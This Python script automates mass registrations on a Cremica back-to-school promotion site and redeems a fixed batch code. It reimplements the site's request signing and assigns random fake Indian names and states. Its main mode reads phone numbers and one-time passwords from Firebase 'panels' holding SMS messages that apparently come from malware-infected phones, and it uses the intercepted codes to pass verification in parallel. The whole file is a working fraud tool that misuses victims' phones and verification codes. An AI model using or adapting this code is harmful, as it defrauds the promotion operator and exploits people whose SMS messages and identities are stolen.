#!/usr/bin/env python3
"""
Cremica School Shuru Automation - parallel processing with Firebase OTP polling.
"""

import json
import base64
import time
import hmac
import hashlib
import random
import string
import sys
import requests
import re
import os
import threading
from urllib.parse import urlparse, parse_qs
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE_URL = "https://cremicabacktoschool.woohoo.in"

DEFAULT_HEADERS = {
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
    "Origin": BASE_URL,
    "Referer": BASE_URL + "/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
    ),
}

INDIAN_FIRST_NAMES = [
    "Aarav", "Vivaan", "Aditya", "Vihaan", "Arjun", "Sai", "Pranav", "Dhruv",
    "Krishna", "Shaurya", "Aryan", "Ananya", "Diya", "Ishita", "Myra", "Sara",
    "Anaya", "Aadhya", "Riya", "Kavya", "Priya", "Neha", "Rohan", "Amit",
    "Rahul", "Vikram", "Karan", "Raj", "Sneha", "Pooja", "Meera", "Nisha",
]
INDIAN_LAST_NAMES = [
    "Sharma", "Verma", "Patel", "Singh", "Kumar", "Gupta", "Joshi", "Rao",
    "Reddy", "Nair", "Menon", "Iyer", "Pillai", "Shah", "Desai", "Bhatt",
    "Agarwal", "Khanna", "Mehta", "Choudhury", "Saxena", "Malhotra",
]
STATES = [
    "Punjab", "Uttar Pradesh", "Haryana", "Rajasthan", "Karnataka",
    "Himachal Pradesh", "Jammu and Kashmir", "Delhi", "Uttarakhand",
    "Bihar", "Maharashtra", "Madhya Pradesh", "Assam", "Kerala",
    "West Bengal", "Gujarat", "Telangana", "Ladakh", "Chandigarh",
]
NL = chr(10)  # newline character - avoids escape sequence issues


def random_indian_name():
    return random.choice(INDIAN_FIRST_NAMES) + " " + random.choice(INDIAN_LAST_NAMES)


def random_state():
    return random.choice(STATES)


def encrypt_payload(payload, user_key, data_key):
    payload_with_ts = payload.copy()
    payload_with_ts["userKey"] = user_key
    payload_with_ts["t"] = int(time.time() * 1000)
    json_str = json.dumps(payload_with_ts, separators=(",", ":"))
    s = base64.b64encode(json_str.encode("utf-8")).decode("utf-8")
    t = payload_with_ts["t"]
    u = base64.b64encode(str(t).encode("utf-8")).decode("utf-8")
    hmac_key = data_key[4:18]
    hmac_input = u + "." + s
    dig = hmac.new(
        hmac_key.encode("utf-8"),
        hmac_input.encode("utf-8"),
        hashlib.sha256,
    ).hexdigest()
    fx = base64.b64encode(dig.encode("utf-8")).decode("utf-8")
    rand_h = random.randint(1, 6)
    rand_p = random.randint(2, 8)
    m = "".join(random.choices(string.ascii_letters + string.digits, k=rand_p))
    return (
        u + "." + s + "." + str(rand_p) + str(rand_h)
        + fx[:rand_h] + m + fx[rand_h:]
    )


def decode_response(json_resp):
    if "resp" in json_resp:
        decoded = base64.b64decode(json_resp["resp"]).decode("utf-8")
        return json.loads(decoded)
    return json_resp


def send_request(endpoint, user_key, data_key, payload,
                 method="POST", access_token=None, session=None):
    url = BASE_URL + "/api/" + endpoint + str(user_key)
    data = encrypt_payload(payload, user_key, data_key)
    form = {"userKey": user_key, "data": data}
    headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
    headers.update(DEFAULT_HEADERS)
    if access_token:
        headers["Authorization"] = "Bearer " + access_token
    sess = session if session else requests.Session()
    resp = sess.request(method, url, data=form, headers=headers)
    resp.raise_for_status()
    json_resp = resp.json()
    decoded = decode_response(json_resp)
    if decoded.get("statusCode") != 200:
        raise Exception("API error: " + str(decoded))
    return decoded


def create_user(session=None):
    url = BASE_URL + "/api/users"
    headers = {"Accept": "application/json", "Content-Type": "application/json"}
    headers.update(DEFAULT_HEADERS)
    sess = session if session else requests.Session()
    resp = sess.post(url, json={}, headers=headers)
    resp.raise_for_status()
    json_resp = resp.json()
    decoded = decode_response(json_resp)
    if decoded.get("statusCode") != 200:
        raise Exception("Create user failed: " + str(decoded))
    return decoded


def track_click(user_key, data_key, session=None):
    return send_request("users/clickTrack/", user_key, data_key,
                        {"type": "GET_STARTED"}, session=session)


def register(user_key, data_key, name, mobile, session=None):
    return send_request("users/register/", user_key, data_key,
                        {"name": name, "mobile": mobile}, session=session)


def verify_otp(user_key, data_key, otp, session=None):
    result = send_request("users/verifyOTP/", user_key, data_key,
                          {"otp": otp}, session=session)
    return result.get("accessToken")


def get_batch_code(user_key, data_key, access_token, batch_code, state, session=None):
    return send_request("users/getBatchCode/", user_key, data_key,
                        {"batchCode": batch_code, "state": state},
                        access_token=access_token, session=session)


# ----------------------------------------------------------------------
# Firebase helpers
def parse_firebase_link(link):
    link = link.strip()
    if link.startswith(("http://", "https://")) and (
        "firebaseio.com" in link or "firebasedatabase.app" in link
    ):
        return link.rstrip("/") + "/"
    parsed = urlparse(link)
    qs = parse_qs(parsed.query)
    encoded = qs.get("s", [None])[0]
    if not encoded:
        return None
    try:
        encoded += "=" * (-len(encoded) % 4)
        decoded = base64.b64decode(encoded).decode("utf-8").split("|")[0].strip()
        if "firebaseio.com" not in decoded and "firebasedatabase.app" not in decoded:
            return None
        return decoded.rstrip("/") + "/"
    except Exception:
        return None


def is_online_device(data):
    if not isinstance(data, dict):
        return False
    for key in ("status", "state", "online", "isOnline", "connected", "isConnected"):
        value = data.get(key)
        if value is True or value == 1:
            return True
        if isinstance(value, str) and value.strip().lower() in {
            "true", "online", "connected", "active", "ready"
        }:
            return True
    return False


def extract_phone_from_messages(device_messages):
    patterns = [
        (re.compile(r"\b(?:\+91|91|0)?([6-9]\d{9})\b"), 10),
        (re.compile(r"\b(?:phone|mobile|number)[\s:]*([6-9]\d{9})\b", re.IGNORECASE), 15),
        (re.compile(r"[^0-9]([6-9]\d{9})[^0-9]"), 5),
    ]
    counts = {}
    if isinstance(device_messages, dict):
        msg_iter = device_messages.values()
    elif isinstance(device_messages, list):
        msg_iter = device_messages
    else:
        return None
    for msg in msg_iter:
        if not isinstance(msg, dict):
            continue
        text = str(msg.get("body") or msg.get("message") or msg.get("text") or "")
        for pattern, score in patterns:
            for number in pattern.findall(text):
                counts[number] = counts.get(number, 0) + score
    if not counts:
        return None
    return max(counts, key=counts.get)


def extract_otp_from_messages(device_messages, trigger_time_ms):
    if isinstance(device_messages, dict):
        items = list(device_messages.items())
    elif isinstance(device_messages, list):
        items = list(reversed(list(enumerate(device_messages))))
    else:
        return None
    for msg_id, msg_data in items:
        if not isinstance(msg_data, dict):
            continue
        try:
            msg_timestamp = int(msg_id)
            if msg_timestamp < (trigger_time_ms - 30000):
                continue
        except (ValueError, TypeError):
            pass
        body = msg_data.get("body") or msg_data.get("message") or msg_data.get("text") or ""
        match = re.search(r"(?<!\d)(\d{4}|\d{6})(?!\d)", body)
        if match:
            return match.group(0)
    return None


def fetch_devices_and_phones(firebase_url):
    try:
        c_req = requests.get(firebase_url.rstrip("/") + "/clients.json", timeout=30)
        c_req.raise_for_status()
        clients_data = c_req.json() or {}
        m_req = requests.get(firebase_url.rstrip("/") + "/messages.json", timeout=30)
        m_req.raise_for_status()
        messages_data = m_req.json() or {}
    except Exception as e:
        print("  [WARN] Failed to fetch Firebase data: " + str(e))
        return []
    if not isinstance(clients_data, dict):
        return []
    online_devices = []
    for c_id, c_data in clients_data.items():
        if is_online_device(c_data):
            online_devices.append(c_id)
    result = []
    seen = set()
    for c_id in online_devices:
        if isinstance(messages_data, dict):
            device_messages = messages_data.get(str(c_id), {})
        else:
            device_messages = {}
        phone = extract_phone_from_messages(device_messages)
        if phone and phone not in seen:
            seen.add(phone)
            result.append({"client_id": c_id, "phone": phone})
    return result


def poll_for_otp(firebase_url, client_id, trigger_time_ms, attempts=10, interval=3):
    for attempt in range(attempts):
        time.sleep(interval)
        try:
            m_req = requests.get(
                firebase_url + "messages/" + client_id + ".json", timeout=15
            )
            messages = m_req.json()
            if not isinstance(messages, dict) and not isinstance(messages, list):
                continue
            otp = extract_otp_from_messages(messages, trigger_time_ms)
            if otp:
                return otp
        except Exception:
            continue
    return None


# ----------------------------------------------------------------------
# Logging
LOG_FILE = "cremica_results.txt"
_log_lock = threading.Lock()
CSV_HEADER = "phone,name,state,batch_code,status,details,timestamp"


def log_result(phone, name, state, batch_code, status, details=""):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with _log_lock:
        needs_header = not os.path.exists(LOG_FILE)
        safe_name = name.replace(",", " ")
        safe_state = state.replace(",", " ")
        safe_details = details.replace(",", " ")
        with open(LOG_FILE, "a", encoding="utf-8") as fh:
            if needs_header:
                fh.write(CSV_HEADER + NL)
            fh.write(
                phone + "," + safe_name + "," + safe_state + ","
                + batch_code + "," + status + "," + safe_details + ","
                + timestamp + NL
            )


# ----------------------------------------------------------------------
# Per-number registration
def process_number(phone, name, state, batch_code,
                   firebase_url=None, client_id=None,
                   manual_otp=False, session=None):
    try:
        user_data = create_user(session)
    except Exception as e:
        log_result(phone, name, state, batch_code, "session_failed", str(e))
        return {"status": "session_failed", "details": str(e)}

    user_key = user_data["userKey"]
    data_key = user_data["dataKey"]

    try:
        track_click(user_key, data_key, session)
    except Exception:
        pass

    try:
        register(user_key, data_key, name, phone, session)
    except Exception as e:
        log_result(phone, name, state, batch_code, "register_failed", str(e))
        return {"status": "register_failed", "details": str(e)}

    otp = None
    if firebase_url and client_id:
        trigger_time_ms = int(time.time() * 1000)
        print("  [" + phone + "] Polling Firebase for OTP (30s timeout)...")
        otp = poll_for_otp(firebase_url, client_id, trigger_time_ms)
        if otp:
            print("  [" + phone + "] Auto-fetched OTP: " + otp)
        else:
            log_result(phone, name, state, batch_code, "otp_timeout",
                       "Firebase no OTP within 30s")
            return {"status": "otp_timeout", "details": "No OTP from Firebase"}

    if manual_otp:
        otp = input("Enter OTP for " + phone + ": ").strip()
        if not otp or len(otp) not in (4, 6):
            log_result(phone, name, state, batch_code, "otp_invalid",
                       "Manual input invalid")
            return {"status": "otp_invalid", "details": "Manual OTP invalid"}

    try:
        access_token = verify_otp(user_key, data_key, otp, session)
    except Exception as e:
        log_result(phone, name, state, batch_code, "verify_failed", str(e))
        return {"status": "verify_failed", "details": str(e)}

    try:
        get_batch_code(user_key, data_key, access_token, batch_code, state, session)
        log_result(phone, name, state, batch_code, "success", "Batch code validated")
        return {"status": "success", "details": "Registration complete"}
    except Exception as e:
        log_result(phone, name, state, batch_code, "batch_failed", str(e))
        return {"status": "batch_failed", "details": str(e)}


# ----------------------------------------------------------------------
# Parallel processing
def process_numbers_parallel(jobs, batch_code, max_workers=5):
    results = []
    total_success = 0
    processed_phones = set()
    processed_lock = threading.Lock()

    def worker(job):
        phone, name, state, fb_url, client_id = job
        with processed_lock:
            if phone in processed_phones:
                print("  [SKIP] Duplicate: " + phone)
                return None
            processed_phones.add(phone)
        session = requests.Session()
        try:
            result = process_number(
                phone, name, state, batch_code,
                firebase_url=fb_url, client_id=client_id,
                manual_otp=False, session=session,
            )
            return (phone, name, state, result)
        finally:
            session.close()

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_job = {executor.submit(worker, job): job for job in jobs}
        for future in as_completed(future_to_job):
            try:
                outcome = future.result()
                if outcome is None:
                    continue
                p, n, st, result = outcome
                status = result["status"]
                details = result.get("details", "")
                print(p + " (" + n + ") - " + status + ": " + details)
                if status == "success":
                    total_success += 1
                results.append({"phone": p, "name": n, "state": st, **result})
            except Exception as e:
                print("[WARN] Worker error: " + str(e))

    return total_success, results


# ----------------------------------------------------------------------
def main():
    if len(sys.argv) < 2:
        input_file = input(
            "Enter the path to your input file (panels.txt or numbers.txt): "
        ).strip()
        if not input_file:
            print("No file provided. Exiting.")
            sys.exit(1)
    else:
        input_file = sys.argv[1]

    manual_mode = "--manual" in sys.argv
    workers = 5
    for i, arg in enumerate(sys.argv):
        if arg.startswith("--workers="):
            try:
                workers = int(arg.split("=", 1)[1])
            except Exception:
                pass
        elif arg == "--workers" and i + 1 < len(sys.argv):
            try:
                workers = int(sys.argv[i + 1])
            except Exception:
                pass

    batch_code = "CD06G26"

    if not os.path.exists(input_file):
        print("[ERROR] File not found: " + input_file)
        sys.exit(1)

    with open(input_file, "r") as fh:
        lines = [line.strip() for line in fh if line.strip()]

    if manual_mode:
        numbers = [line for line in lines if line.isdigit() and len(line) >= 10]
        print("Manual mode: processing " + str(len(numbers)) + " numbers")
        processed = set()
        for number in numbers:
            if number in processed:
                print("  [SKIP] Duplicate: " + number)
                continue
            processed.add(number)
            name = random_indian_name()
            state = random_state()
            print("")
            print("Processing " + number + " (" + name + ", " + state + ")")
            session = requests.Session()
            result = process_number(
                number, name, state, batch_code,
                manual_otp=True, session=session,
            )
            session.close()
            print("  -> " + result["status"] + ": " + result.get("details", ""))
    else:
        panel_urls = []
        for line in lines:
            parsed = parse_firebase_link(line)
            if parsed:
                panel_urls.append(parsed)
            else:
                print("  [WARN] Invalid Firebase URL: " + line)
        if not panel_urls:
            print("No valid Firebase URLs found.")
            sys.exit(1)

        print("Processing " + str(len(panel_urls)) + " Firebase panels with "
              + str(workers) + " workers...")
        all_jobs = []
        for idx, fb_url in enumerate(panel_urls, 1):
            print("")
            print("Panel " + str(idx) + "/" + str(len(panel_urls)) + ": " + fb_url)
            devices = fetch_devices_and_phones(fb_url)
            if not devices:
                print("  [WARN] No online devices with phone numbers found.")
                continue
            print("  Found " + str(len(devices)) + " online device(s).")
            for dev in devices:
                phone = dev["phone"]
                name = random_indian_name()
                state = random_state()
                all_jobs.append((phone, name, state, fb_url, dev["client_id"]))

        if not all_jobs:
            print("No numbers to process.")
            sys.exit(0)

        print("")
        print("Collected " + str(len(all_jobs)) + " unique numbers across all panels.")
        total_success, results = process_numbers_parallel(
            all_jobs, batch_code, max_workers=workers,
        )
        print("")
        print("All done! Total successes: " + str(total_success))
        print("Results logged to " + LOG_FILE)


if __name__ == "__main__":
    main()
